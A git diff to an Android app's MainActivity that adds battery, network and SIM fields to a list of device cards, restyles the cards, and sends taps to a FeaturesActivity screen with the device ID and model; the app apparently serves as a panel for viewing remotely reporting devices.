@@ -52,7 +52,11 @@ public class MainActivity extends Activity {
                         d.getString("model"),
                         d.optString("android", "?"),
                         d.optString("last_seen", ""),
-                        d.optString("ip", "")
+                        d.optString("ip", ""),
+                        d.optString("battery", "?"),
+                        d.optString("network", "?"),
+                        d.optString("sim1", "?"),
+                        d.optString("sim2", "?")
                     });
                 }
                 runOnUiThread(() -> {
@@ -60,11 +64,10 @@ public class MainActivity extends Activity {
                     for (String[] data : list) {
                         LinearLayout item = new LinearLayout(MainActivity.this);
                         item.setOrientation(LinearLayout.VERTICAL);
-                        item.setBackgroundColor(0xFF1A1A2E);
+                        item.setBackground(getDrawable(R.drawable.card_border));
                         item.setPadding(20, 20, 20, 20);
                         LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
-                                LinearLayout.LayoutParams.MATCH_PARENT,
-                                LinearLayout.LayoutParams.WRAP_CONTENT);
+                                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
                         lp.setMargins(0, 0, 0, 12);
                         item.setLayoutParams(lp);
 
@@ -79,7 +82,7 @@ public class MainActivity extends Activity {
                         modelView.setTextSize(14);
 
                         TextView ipView = new TextView(MainActivity.this);
-                        ipView.setText("IP: " + data[4]);
+                        ipView.setText("IP: " + data[4] + " | Bat: " + data[5] + "%");
                         ipView.setTextColor(0xFF9AA3B2);
                         ipView.setTextSize(12);
 
@@ -88,8 +91,9 @@ public class MainActivity extends Activity {
                         item.addView(ipView);
 
                         item.setOnClickListener(v -> {
-                            Intent i = new Intent(MainActivity.this, ControlActivity.class);
+                            Intent i = new Intent(MainActivity.this, FeaturesActivity.class);
                             i.putExtra("deviceId", data[0]);
+                            i.putExtra("deviceModel", data[1]);
                             startActivity(i);
                         });
 
